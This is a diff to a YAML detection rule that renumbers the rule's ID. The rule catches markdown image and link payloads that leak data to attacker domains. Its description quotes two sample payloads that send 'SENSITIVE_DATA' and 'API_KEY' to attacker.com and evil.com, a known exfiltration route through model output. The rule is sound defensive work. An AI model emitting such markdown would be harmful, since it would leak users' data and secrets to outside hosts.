@@ -1,12 +1,12 @@
 title: "Direct Markdown Image/Link Exfil Payload (attacker.com / evil.com)"
-id: ATR-2026-001454
+id: ATR-2026-01454
 rule_version: 1
 status: stable
 description: >
   Detects markdown image and link syntax that directly embeds attacker-controlled
   domains (attacker.com, evil.com, exfil.*, collect.*) with exfiltration-specific
   query parameters. Unlike ATR-2026-00501 (which detects instruction patterns) and
-  ATR-2026-001453 (which detects the base64-QUERY template), this rule detects the
+  ATR-2026-01453 (which detects the base64-QUERY template), this rule detects the
   artifact itself when it appears directly in input — e.g. a raw payload like
   "![](https://attacker.com/collect?data=SENSITIVE_DATA)" or
   "[Click here](https://evil.com/?secret=API_KEY)". These appear as standalone
@@ -110,7 +110,7 @@ response:
     - escalate
   auto_response_threshold: high
   message_template: >
-    [ATR-2026-001454] CRITICAL: Direct markdown exfil payload detected. Input contains
+    [ATR-2026-01454] CRITICAL: Direct markdown exfil payload detected. Input contains
     markdown image or link with attacker-controlled domain or exfiltration query parameters.
     Request blocked.
 
